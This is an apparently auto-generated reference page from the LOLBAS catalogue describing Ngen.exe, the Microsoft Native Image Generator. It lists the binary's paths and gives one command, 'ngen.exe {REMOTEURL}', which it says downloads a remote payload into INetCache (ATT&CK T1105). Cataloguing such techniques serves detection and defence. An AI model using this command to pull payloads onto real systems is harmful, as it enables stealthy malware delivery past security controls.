---
title: "Ngen.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Ngen.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ngen.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Ngen.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Ngen.exe

Microsoft Native Image Generator.

## Metadata

- Category: OSBinaries
- Created: 2024-02-19
- Author: Avihay Eldad
- Source Path: yml/OSBinaries/Ngen.yml

## Paths

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe`

## Commands

### 1. Download

Downloads payload from remote server using the Microsoft Native Image Generator utility.

```cmd
ngen.exe {REMOTEURL}
```

- Use Case: It will download a remote payload and place it in INetCache.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Acknowledgements

- {'Person': 'Avihay Eldad', 'Handle': '@AvihayEldad'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ngen.yml)
